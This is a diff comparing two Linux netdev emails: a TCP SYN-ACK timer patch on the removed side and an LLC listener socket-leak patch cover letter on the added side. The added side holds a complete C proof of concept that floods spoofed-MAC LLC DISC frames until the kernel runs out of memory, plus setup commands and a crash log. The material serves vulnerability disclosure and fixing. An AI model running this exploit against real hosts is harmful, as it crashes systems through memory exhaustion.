@@ -1,69 +1,76 @@
-Received: from mail-pl1-f171.google.com (mail-pl1-f171.google.com [209.85.214.171])
+Received: from mail-pl1-f172.google.com (mail-pl1-f172.google.com [209.85.214.172])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 273DF1DF980
-	for <netdev@vger.kernel.org>; Sat, 22 Aug 2026 08:20:05 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.171
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 760D538F624
+	for <netdev@vger.kernel.org>; Sat, 22 Aug 2026 08:24:09 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.172
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1787386806; cv=none; b=Dv7BQQKgffPx8Xrr1/VoNCQHfexgImHb6kKDTkA8bjDv3zqRHQVS4jM9d4MYtvt2DEE+Xnb84ihVUP8Pfx40na8oWEW8tFQZcdyFhBhrRy33G4EqX/hDZoBAC8Hn1uufDLv3IBwkGGsjtA3XUh0xJ18ToNBYsppg7H5YlaGhHPg=
+	t=1787387053; cv=none; b=AdqmsEEmFg+TO6ZVfx3CWDmbX3t3yLuwZNlOJBFj2q7v8mnTbqMC88yTxu8TNRcIyuWMII351EfH7ammPSaR59hrIaWJlNWwMOK/iVcj81Dd02Qbnxt83mi5gWS1sJoQuE8sX8gdKVw7e58v6GEIds7MImcBHbNu2Y0zz0VGkME=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1787386806; c=relaxed/simple;
-	bh=Que7vWS0ff/mcugy7iYYDvqlqes2YX+MJRhezyALnn0=;
-	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=UxHmeCzzKFz9YmRFv23zO69d/eUA8d/hL+tdXN60yfZyRpqH986fmnFCKTEnxMpKd1OGAzyynqdArD5XlJx7+6jCJ64dq9dhxrX7xzZEkMbzcbxesTvmGOSYAuCoFPh8kErT49iB/PQEq3BN8ac34AsgjrWk8iBE94qFbOp6qz8=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; arc=none smtp.client-ip=209.85.214.171
+	s=arc-20240116; t=1787387053; c=relaxed/simple;
+	bh=JRnC9L3BV9wMIgjP7E8e+ebpTPHHdwSSbpiK/5F9Kb4=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=QOqihFUKyPreVagBA33v7BSyir7v5NpN4XutHXE96w1cH+KMkpkOd5FfRk+B+A1IAdX3MCNwsvnZECY2rWoTE1ry/9mlRVGHM/ZoZv9SRKjcc1hE2W49AEIkf9+iBrpmWZlrfRGv/w6QYHIcPObNCnV4t3kf+OYwP6oMBxDjBBI=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=hkXTLieb; arc=none smtp.client-ip=209.85.214.172
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
-Received: by mail-pl1-f171.google.com with SMTP id d9443c01a7336-2caea3f742bso29050005ad.0
-        for <netdev@vger.kernel.org>; Sat, 22 Aug 2026 01:20:05 -0700 (PDT)
+Authentication-Results: smtp.subspace.kernel.org;
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="hkXTLieb"
+Received: by mail-pl1-f172.google.com with SMTP id d9443c01a7336-2caea3f742bso29077625ad.0
+        for <netdev@vger.kernel.org>; Sat, 22 Aug 2026 01:24:08 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1787387047; x=1787991847; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=iH5K296ArXgv7BR97hs8i8b+cViGs0PpeC3LIiGyTVw=;
+        b=hkXTLiebC3MNpdWdL/G1owK7Zr/50VyQMsZ/ZOUfsv7TKa+UcZYGFLpCq8/7cgUAxB
+         tSuihZCdPa8wPDNW9wLb2dtrGD4CsxjKu5X9a5shbvncmDMx9q7lkBeck5BOHxmYnzmk
+         5KpSLvhQHXTjK6Xm6u2c5pEvmIBKuqgXP5Cn1xCebqpa7W6THB3GkFYo23SOrIsXkJgk
+         avJoNE9shoJE+a7Z+Q9pzNxcGk0FiITGHSJzv0Soj9nijzRYNRKEk4kDqEuwgiJk2zrO
+         AsHIcQm8r+lKX1gwkYnkJLFvbnCtAD4gMGQNelZtgjqh9rJSAdVQfXVvOryauX4Ml4Es
+         z5yw==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1787386804; x=1787991604;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to:content-type;
-        bh=IXpU5gBxhimOqAaXfWedaBSQtTEfj3qqqpdSicXgXoU=;
-        b=m4h8h8S8jNsHE8mD5FiDEBp/qOw7ab+OdstEKV8jLIa1n/48HSH6OLsT+QALmeaPLI
-         Rw8hgOxnFn1iTyUIw1XUtO8o2IArTrjY25Y6Ls4Lx79aQttP3EmUOWxjDkHXQ3RP+a2z
-         BjawY/vUHnUUEYVDX5hUTdPv6sSqbj5ynXhr4MOa07osVgpCdIlpOkwsuwfWm9+sVb7b
-         zP65Ijju1S13mxabdt1Yjp+svtZ9k6dwHITJR31OKuXgpla8Spf3s0v+gkFUNQ39S0mz
-         iR8CdNDDSkN3nzjVSnihiwIdOQt4BqBLELFuqxyIqtg2KJHgNbXtmmJr7QNKuwnI9dz7
-         IWyA==
-X-Forwarded-Encrypted: i=1; AHgh+RrXJA940/kdBXObGsuM0cwj2Yr3ObwfFk4WzC4528p8sKLjFSIIhA9U2TZHe2NX8TamEVTcSbE=@vger.kernel.org
-X-Gm-Message-State: AFuF++kNSvkpPJlk0r6UwAmSBIXQmN7N9vWhMx2pmTdwibgegLxfXnWQ
-	oaFTnMRK3PZWJqh+0EvZCL8qHMYhF+MboDjHPLkMFyj8Fc0W83luNV4Rb7omc9Lizgm5vhnJv+v
-	OoPY7uGOt
-X-Gm-Gg: AR+sD13IFUXz/6DSjVXEfRajbMqCAplVRC/sV/N5HptgvszGBfTb6KHsoInCrM9fsaE
-	O0OpctQM2TlJNT52tJycK8EzyyumNSQSiKb9NX3WAbA4cqwbXHw/NaxFvJ4AwfIU+27WsWoZvtC
-	vWfikftipX3XJSFx9x8WnO3gOa1W6F20GADHwVjg5inHDHv7ZFwTt93DbuUc0xZAP0zOFgjTHhk
-	Vq9YsEgDOOZoXHZ1A5hOkaSc4L1WUKzNr7SOMT7VJycLe7z4Ng8GxDz1ci3V0QJQasmPiV+zyzK
-	N1duxWGgvBaGqf5KdMDy6xXCB0F1H/7ERqKgEqroydOD2W0Vw/uJDFRO5O7odrCLSg0fgyYN4jV
-	ve1NTtQ3gWwatpDa3GYalBv2hnjC4yePpjLh7R0xhdlYGWezTuhdaJ23nVMYIJLWAbfDpY/2cZo
-	FJRU+/EmkrDenASfcHXv2aMdwK/4tefE2YfbG+S6WSP8bsQg==
-X-Received: by 2002:a17:903:46cc:b0:2c9:b396:1a55 with SMTP id d9443c01a7336-2d64b162098mr244571005ad.12.1787386804348;
-        Sat, 22 Aug 2026 01:20:04 -0700 (PDT)
-Received: from Roxy.localdomain ([2602:feda:30:ae86:2bd:64ff:feda:6b7b])
-        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-327f90c0de2sm4367453eec.8.2026.08.22.01.19.59
+        d=1e100.net; s=20251104; t=1787387047; x=1787991847;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=iH5K296ArXgv7BR97hs8i8b+cViGs0PpeC3LIiGyTVw=;
+        b=bLeWO3SdwH3H29U+oWiM7rPgJ5bJVXfY/Hn1tMio3Qw346wZ8BpJlgE8zglsJmYcVm
+         iewN0gbGTNhboFk9DMlfbFWdmHI6c4N0zPJxAQr0qAwH0RcgdViE4Rd+kUW1GeaOQJeh
+         xpie7JpLJlAE4vGvbgFRkACfcfl2a2z3YsJUqQMxvcFOuLqKMBwTKCUQHBJTjHZ3vhsb
+         rPzps7xRodAyPykuSHDNtZWsMWEkXwo4E374WNKxLHCNEHizKk6R0S/QdoSZG1LMmts6
+         34YzkNnQo5Oo7nK4We04JxPPZ2TxXylTRrxwl94x7IzbJOcUPWnVtA3KTSnUDUXB9gEO
+         g2bA==
+X-Gm-Message-State: AFuF++mhkqIZ+S0uGutR2Pj3Awcm0TyrrhHS6S8IdeRh58UnPUfjutmg
+	Uq3OV6Ld0oew4qTqx7WfoHHaFcFcHQmXmquaIF4zOXDGWUecPBIuJO4J7qFS7zXKdEJ9mD0ji2g
+	oqlK8VFAQVNU=
+X-Gm-Gg: AR+sD13iGJ571YFfVqdxFZF3gv8WbNxvELDcAr1FtiiNFVzxxQMybbpKr4U08NVVJlz
+	ed+EJ8Xlb7iX47d3MDvJtHOz4pBpIRAVHU9aqwBPGYIp7MyU7ZS3l5hIFkPVulB75J07ZsyDM7v
+	SX7JwB/yLEPTpPrTNPvEhNSFB7+iNkX5SLgvZXXQtWGFi5Z9G0n5lXHwYKI2Wnc+ayp4P96OMvq
+	ayTFwvrFCjlsExX7qzAbRFPT59HQt9M2iKK6gK2soks6Mv10Cr0AssxToodmUSXuHW/4z070t2e
+	F688qLb8jDVXdP0otd++qc0xQhc62VI+MfCdzS4dlp3S5sUw+Y4amvWQ1o9eVSLnQ3kaXsz3cKD
+	HKN37wl0RJKN5gzM5t+T4COhj8JfoCIrJz23wii9n0j8juPswwQcm6+AmVuJVjOHJCIbg0A+Iif
+	g2CQZrgeMJaU4zNxgDXsCXBoiDCUgDBvlRTw66JE8DAMLb260mqVMJThBLqRa6SB1Fxg5VcGSR8
+	NDEljqA9bAuY0vcWa3ILQxddE4=
+X-Received: by 2002:a17:902:e949:b0:2d6:3c2f:6a5 with SMTP id d9443c01a7336-2d64b1d68bemr245041835ad.14.1787387046936;
+        Sat, 22 Aug 2026 01:24:06 -0700 (PDT)
+Received: from gmail.com ([115.192.250.163])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d6768f1379sm2647875ad.82.2026.08.22.01.24.03
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sat, 22 Aug 2026 01:20:03 -0700 (PDT)
-From: Zhiling Zou zhilinz@nebusec.ai
-To: pabeni@redhat.com,
-	netdev@vger.kernel.org,
-	linux-doc@vger.kernel.org
-Cc: davem@davemloft.net,
-	edumazet@google.com,
-	horms@kernel.org,
-	corbet@lwn.net,
-	skhan@linuxfoundation.org,
-	ncardwell@google.com,
-	kuniyu@google.com,
-	vega@nebusec.ai,
-	zhilinz@nebusec.ai
-Subject: [PATCH net v6 1/1] tcp: bound SYN-ACK timers to reqsk timeout range
-Date: Sat, 22 Aug 2026 16:19:46 +0800
-Message-ID: <ba3cd75e76ef82b0ff5b393ff9e54056c00e90eb.1787382800.git.zhilinz@nebusec.ai>
-X-Mailer: git-send-email 2.43.0
-In-Reply-To: <cover.1787382800.git.zhilinz@nebusec.ai>
-References: <cover.1787382800.git.zhilinz@nebusec.ai>
+        Sat, 22 Aug 2026 01:24:06 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netdev@vger.kernel.org
+Cc: "David S . Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Paolo Abeni <pabeni@redhat.com>,
+	Simon Horman <horms@kernel.org>,
+	linux-kernel@vger.kernel.org,
+	stable@vger.kernel.org,
+	Zihan Xi <zihanx@nebusec.ai>
+Subject: [PATCH net v5 0/2] llc: fix listener child socket leaks before passive open completes
+Date: Sat, 22 Aug 2026 08:23:52 +0000
+Message-ID: <20260822082354.3109-1-zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -72,232 +79,382 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-From: Zhiling Zou <zhilinz@nebusec.ai>
+Hi Linux kernel maintainers,
 
-request_sock::num_timeout is a 7-bit counter. Commit e6c022a4fa2d
-("tcp: better retrans tracking for defer-accept") split this counter
-out of an 8-bit field, but tcp_synack_retries still accepts an 8-bit
-value and TCP_DEFER_ACCEPT can still derive a retry count up to 255.
+We found and validated a issue in net/llc/llc_conn.c. The reproducer needs
+CAP_NET_RAW and CAP_NET_ADMIN in init_net.
+We've tested it, and it should not affect any other functionality.
 
-If these settings exceed 127, the regular request timer cannot reach
-its expiration threshold and num_timeout wraps to zero. After the wrap,
-the request can keep timing out instead of expiring, and the next
-zero-to-one transition repeats the young-queue accounting decrement.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-Both request timer paths can also shift req->timeout by 64 or more while
-calculating the next RTO. UBSAN reports that invalid shift, and systems
-with panic_on_warn=1 panic before the later cap can take effect.
+---- details below ----
 
-Keep the tcp_synack_retries sysctl range unchanged, but cap its effective
-value in both SYN-ACK timer paths. Cap the TCP_DEFER_ACCEPT conversion at
-the same range so its timer and bare-ACK consumers agree. Saturate the RTO
-calculation before shifting, and cap the Fast Open extra retry as well.
+Bug details:
 
-Snapshot the request timeout and num_timeout once before the bounds check
-and shift. num_timeout is a bitfield, so add a raw view of its existing
-storage byte for a compile-safe READ_ONCE() snapshot. This keeps the check
-and shift consistent when the timer concurrently increments num_timeout.
+llc_conn_handler() creates a passive-open child for every frame matched by an
+LLC listener. The child is immediately inserted in the SAP tables and takes a
+device reference, before the LLC state machine proves that the frame is a real
+passive open and before LLC_CONN_PRIM makes it available to accept().
 
-Fixes: e6c022a4fa2d ("tcp: better retrans tracking for defer-accept")
-Cc: stable@vger.kernel.org
-Reported-by: Vega <vega@nebusec.ai>
-Signed-off-by: Zhiling Zou <zhilinz@nebusec.ai>
----
-changes in v6:
-- Keep the tcp_synack_retries sysctl range unchanged and cap the effective
-  retry count only in the regular and Fast Open timer paths.
-- Snapshot num_timeout and timeout once before the bounds check and shift.
-- Use a raw view of num_timeout's bitfield storage for the compile-safe
-  READ_ONCE() snapshot.
-- v5 Link: https://lore.kernel.org/all/9ec8921d81d6218946e07e8542b1ac41b6e2d205.1786540242.git.zhilinz@nebusec.ai/
+A non-SABME frame never reaches that indication. The old path therefore leaves
+a published child behind which accept() cannot return. The same lifecycle gap
+also remains for SABME traffic when direct processing, backlog enqueue, or
+backlog processing exits before LLC_CONN_PRIM, and when a listener is closed
+with queued but unaccepted children.
+
+The fix creates children only for SABME commands. DISC and other commands that
+need an ADM-state DM reply are answered directly from the listener using the
+packet source address, while other non-SABME traffic is dropped without driving
+the listener state machine.
+
+For SABME, the child remains in the SAP tables during passive open so tuple
+lookup continues to win over the listener. The patch tracks children through
+pending and queued states, routes packets for a pending child through the
+listener-side handshake, and removes any child that has not been accepted when
+a failure, backlog drop, or listener close occurs. Cleanup is not gated on the
+current TCP state, so children are also released if the socket leaves
+TCP_LISTEN before close. Process-context child-lock acquisition is serialized
+with bottom halves disabled. Final child destruction is deferred to process
+context so its timers can be synchronized safely.
+
+The root-cause fact fixed here predates d389424e00f9. Its parent already
+creates a listener-side child, publishes it to the SAP tables before
+LLC_CONN_PRIM, and has no rollback path if processing exits early. In the local
+visible history, the earliest commit where that root-cause fact is already
+present is 1da177e4c3f4 ("Linux-2.6.12-rc2"), so Fixes points there.
+
+The reproducer writes panic_on_oom only to turn the final memory exhaustion into
+stable crash evidence after the leak is already confirmed. It is not a
+prerequisite for the underlying bug or for the required-capability
+trigger path itself.
+
+packetdrill was not used here because the trigger depends on combining a PF_LLC
+listening socket with raw AF_PACKET injection over a veth pair while rotating
+the source MAC address to force distinct passive-open children. The PoC is
+centered on that listener-plus-raw-packet resource leak path rather than on a
+packetdrill-friendly timing script.
+
+Reproducer:
+
+    gcc -O2 -static -o poc poc.c
+    ./poc llc_rx0 llc_tx0 110000
+
+For the validated run we used the privileged init_net setup below so the PoC
+could create llc_rx0/llc_tx0 and then send the crafted LLC traffic:
+
+    ip link add llc_rx0 type veth peer name llc_tx0
+    ip link set llc_rx0 address 02:11:22:33:44:55
+    ip link set llc_tx0 address 02:11:22:33:44:66
+    ip link set llc_rx0 up
+    ip link set llc_tx0 up
+    ./poc llc_rx0 llc_tx0 110000
+
+For deterministic crash evidence only, after confirming the leak with that
+required-capability trigger path, we additionally set:
+
+    echo 2 > /proc/sys/vm/panic_on_oom
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/if_arp.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <linux/if.h>
+#include <linux/llc.h>
+#include <net/ethernet.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#ifndef AF_LLC
+#define AF_LLC 26
+#endif
+
+#define DEFAULT_RX_IF "llc_rx0"
+#define DEFAULT_TX_IF "llc_tx0"
+#define DEFAULT_SAP 0xc0
+#define DEFAULT_REPORT_EVERY 10000ULL
+
+static void die_errno(const char *what)
+{
+	perror(what);
+	exit(EXIT_FAILURE);
+}
+
+static void usage(const char *prog)
+{
+	fprintf(stderr,
+		"usage: %s [rx_if] [tx_if] [count]\n"
+		"  rx_if: LLC listener interface (default: %s)\n"
+		"  tx_if: raw packet sender interface (default: %s)\n"
+		"  count: number of DISC frames to send, 0 means forever\n",
+		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
+}
+
+static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
+{
+	struct ifreq ifr;
+	int fd;
+
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0)
+		die_errno("socket(AF_INET)");
+
+	memset(&ifr, 0, sizeof(ifr));
+	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
+	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
+		die_errno("ioctl(SIOCGIFHWADDR)");
+
+	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
+	close(fd);
+}
+
+static int get_ifindex(const char *ifname)
+{
+	struct ifreq ifr;
+	int fd;
+
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0)
+		die_errno("socket(AF_INET)");
+
+	memset(&ifr, 0, sizeof(ifr));
+	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
+	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
+		die_errno("ioctl(SIOCGIFINDEX)");
+
+	close(fd);
+	return ifr.ifr_ifindex;
+}
+
+static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
+{
+	struct sockaddr_llc addr;
+	int fd;
+
+	fd = socket(AF_LLC, SOCK_STREAM, 0);
+	if (fd < 0)
+		die_errno("socket(AF_LLC)");
+
+	get_if_hwaddr(ifname, mac);
+
+	memset(&addr, 0, sizeof(addr));
+	addr.sllc_family = AF_LLC;
+	addr.sllc_arphrd = ARPHRD_ETHER;
+	addr.sllc_sap = sap;
+	memcpy(addr.sllc_mac, mac, ETH_ALEN);
+
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+		die_errno("bind(AF_LLC)");
+	if (listen(fd, 16) < 0)
+		die_errno("listen(AF_LLC)");
+
+	return fd;
+}
+
+static int make_packet_socket(const char *ifname, int *ifindex_out)
+{
+	struct sockaddr_ll sll;
+	int fd;
+	int one = 1;
+	int ifindex = get_ifindex(ifname);
+
+	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+	if (fd < 0)
+		die_errno("socket(AF_PACKET)");
+
+	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
+
+	memset(&sll, 0, sizeof(sll));
+	sll.sll_family = AF_PACKET;
+	sll.sll_protocol = htons(ETH_P_ALL);
+	sll.sll_ifindex = ifindex;
+
+	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
+		die_errno("bind(AF_PACKET)");
+
+	*ifindex_out = ifindex;
+	return fd;
+}
+
+static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
+{
+	mac[0] = 0x02;
+	mac[1] = (n >> 32) & 0xff;
+	mac[2] = (n >> 24) & 0xff;
+	mac[3] = (n >> 16) & 0xff;
+	mac[4] = (n >> 8) & 0xff;
+	mac[5] = n & 0xff;
+}
+
+int main(int argc, char **argv)
+{
+	static unsigned char frame[ETH_ZLEN];
+	unsigned char dst_mac[ETH_ALEN];
+	unsigned char src_mac[ETH_ALEN];
+	struct sockaddr_ll sll;
+	const char *rx_if = DEFAULT_RX_IF;
+	const char *tx_if = DEFAULT_TX_IF;
+	uint64_t count = 0;
+	uint64_t i = 1;
+	int listener_fd;
+	int packet_fd;
+	int ifindex;
+
+	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
+		usage(argv[0]);
+		return 0;
+	}
+	if (argc > 1)
+		rx_if = argv[1];
+	if (argc > 2)
+		tx_if = argv[2];
+	if (argc > 3) {
+		char *end = NULL;
+
+		errno = 0;
+		count = strtoull(argv[3], &end, 0);
+		if (errno || !end || *end != '\0') {
+			fprintf(stderr, "invalid count: %s\n", argv[3]);
+			return EXIT_FAILURE;
+		}
+	}
+	if (argc > 4) {
+		usage(argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
+	packet_fd = make_packet_socket(tx_if, &ifindex);
+
+	memset(frame, 0, sizeof(frame));
+	memcpy(frame, dst_mac, ETH_ALEN);
+	((struct ethhdr *)frame)->h_proto = htons(3);
+	frame[ETH_HLEN + 0] = DEFAULT_SAP;
+	frame[ETH_HLEN + 1] = 0x04;
+	frame[ETH_HLEN + 2] = 0x43; /* DISC command, P/F=0 */
+
+	memset(&sll, 0, sizeof(sll));
+	sll.sll_family = AF_PACKET;
+	sll.sll_ifindex = ifindex;
+	sll.sll_halen = ETH_ALEN;
+	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);
+
+	fprintf(stderr,
+		"listener_if=%s sender_if=%s sap=0x%02x count=%s\n",
+		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
+	fprintf(stderr,
+		"listener_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
+		dst_mac[0], dst_mac[1], dst_mac[2],
+		dst_mac[3], dst_mac[4], dst_mac[5]);
+	fprintf(stderr,
+		"sending LLC DISC commands with a unique spoofed source MAC each time\n");
+
+	while (!count || i <= count) {
+		fill_src_mac(src_mac, i);
+		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
+			src_mac[ETH_ALEN - 1] ^= 1;
+		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);
+
+		if (sendto(packet_fd, frame, sizeof(frame), 0,
+			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
+			die_errno("sendto(AF_PACKET)");
+
+		if (!(i % DEFAULT_REPORT_EVERY))
+			fprintf(stderr, "sent=%llu\n",
+				(unsigned long long)i);
+		i++;
+	}
+
+	close(packet_fd);
+	close(listener_fd);
+	return 0;
+}
+------END poc.c--------
+
+----BEGIN crash log----
+[ 1665.704541][T10284] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
+
+[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.74 #3
+
+[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+
+[ 1665.706676][T10284] Call Trace:
+
+[ 1665.706943][T10284]  <TASK>
+
+[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:105 (discriminator 2))
+
+[1665.707568][T10284] panic (kernel/panic.c:339 (discriminator 1))
+
+[1665.707918][T10284] ? dump_header (include/linux/rcupdate.h:815 (discriminator 1) mm/oom_kill.c:455 (discriminator 1) mm/oom_kill.c:478 (discriminator 1))
+
+[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:277)
+-----END crash log-----
 
 changes in v5:
-- Limit tcp_synack_retries and TCP_DEFER_ACCEPT at their configuration
-  paths, so all users of each value see the same 7-bit range.
-- Use 127, matching request_sock::num_timeout, instead of the previous
-  runtime limit of 63, and document the sysctl limit.
-- Spell out the 7-bit range mismatch, the repeated young-queue accounting,
-  and the UBSAN panic_on_warn failure mode in the commit message.
-- Keep the timeout calculation saturating before either SYN-ACK timer
-  shifts it.
-- Drop a no-op reqsk_timer_handler() formatting hunk.
-- Correct the Fixes tag and update the reporter and sign-off trailers.
-- v4 Link: https://lore.kernel.org/all/891a220c362e3266efdf6b1aa9dc3e52f6825c00.1784735392.git.zhilinz@nebusec.ai/
+  - Make listener child cleanup unconditional so queued children are also
+    released if the socket leaves TCP_LISTEN before close.
+  - Serialize process-context child cleanup and backlog dispatch with bottom
+    halves disabled, avoiding child-lock acquisition races with LLC receive
+    and timer paths.
+  - Drop packets redirected through a pending child after its listener is no
+    longer listening, and release children left out of service instead of
+    dispatching them.
+  - Split the LLC_CONN_OUT_OF_SVC lower-bound check into a separate patch.
+  - v4 Link: https://lore.kernel.org/all/20260814185843.4748-1-zihanx@nebusec.ai/
+changes in v4:
+  - Create a passive-open child only for SABME and generate listener-side DM
+    replies directly for non-SABME commands.
+  - Use an atomic incoming-child lifecycle and serialize pending-child lookup,
+    backlog processing, rollback, and listener close with the child lock.
+  - Keep immediate SAP publication for passive-open tuple matching, but release
+    unaccepted children on direct and backlog failures and on listener close.
+  - Defer final incoming-child cleanup to workqueue context so timer
+    synchronization does not run in the receive softirq path.
+  - Add an LLC state lower-bound check before state-table dispatch.
+  - v3 Link: https://lore.kernel.org/all/20260805175945.10698-1-zihanx@nebusec.ai/
+changes in v3:
+  - Drop the unused llc_conn_handler() local rc variable reported in review.
+  - Rebase the numbered patch and cover onto commit
+    ede76849012e45ffb2193ad110b42027eec02c5c.
+  - v2 Link: https://lore.kernel.org/all/cover.1785386749.git.zihanx@nebusec.ai/
+changes in v2:
+  - Rework the fix to preserve the existing passive-open tuple matching
+    semantics instead of deferring child publication until LLC_CONN_PRIM.
+  - Track listener-created children pending publication to accept(), and roll
+    them back on every earlier failure or drop path.
+  - Cover the original non-SABME leak and SABME paths which fail before
+    LLC_CONN_PRIM, including backlog enqueue and backlog drop failures.
+  - Correct Fixes to 1da177e4c3f4 ("Linux-2.6.12-rc2") based on the earliest
+    locally visible history carrying the same root-cause fact.
+  - Clarify panic_on_oom crash evidence and packetdrill selection.
+  - v1 Link: https://lore.kernel.org/all/cover.1784725007.git.zihanx@nebusec.ai/
 
-Changes in v4:
-  - Drop the tcp_synack_retries sysctl maximum to preserve existing
-    user-space behavior, and keep the runtime clamps at the timer usage
-    sites.
-  - v3 Link: https://lore.kernel.org/all/20260702095324.2995243-1-n05ec@lzu.edu.cn/
+Best regards,
+Zihan Xi
 
-Changes in v3:
-  - Order local variables in tcp_reqsk_timeout_sk() by reverse Christmas
-    tree.
-  - v2 Link: https://lore.kernel.org/all/20260630035009.55201-1-n05ec@lzu.edu.cn/
+Zihan Xi (2):
+  llc: fix listener child socket leaks before passive open completes
+  llc: reject out-of-service state before state lookup
 
-Changes in v2:
-  - Keep the existing max_retries calculation in
-    tcp_fastopen_synack_timer() and only add the clamp, avoiding code
-    churn.
-  - v1 Link: https://lore.kernel.org/all/02e24eb83639e9d7ecc623f000c60254bb5c40a5.1782643946.git.roxy520tt@gmail.com/
+ include/net/llc_conn.h |  13 +-
+ net/llc/af_llc.c       |   9 +-
+ net/llc/llc_conn.c     | 266 ++++++++++++++++++++++++++++++++++++++---
+ 3 files changed, 271 insertions(+), 17 deletions(-)
 
- Documentation/networking/ip-sysctl.rst |  2 +-
- include/net/request_sock.h             | 20 ++++++++++++++++++--
- include/net/tcp.h                      | 21 +++++++++++++++++----
- net/ipv4/inet_connection_sock.c        |  2 ++
- net/ipv4/tcp.c                         |  2 +-
- net/ipv4/tcp_timer.c                   |  6 ++++--
- 6 files changed, 43 insertions(+), 10 deletions(-)
-
-diff --git a/Documentation/networking/ip-sysctl.rst b/Documentation/networking/ip-sysctl.rst
-index 208f46967ee59..fd5038b6cab9f 100644
---- a/Documentation/networking/ip-sysctl.rst
-+++ b/Documentation/networking/ip-sysctl.rst
-@@ -954,7 +954,7 @@ tcp_stdurg - BOOLEAN
- 
- tcp_synack_retries - INTEGER
- 	Number of times SYNACKs for a passive TCP connection attempt will
--	be retransmitted. Should not be higher than 255. Default value
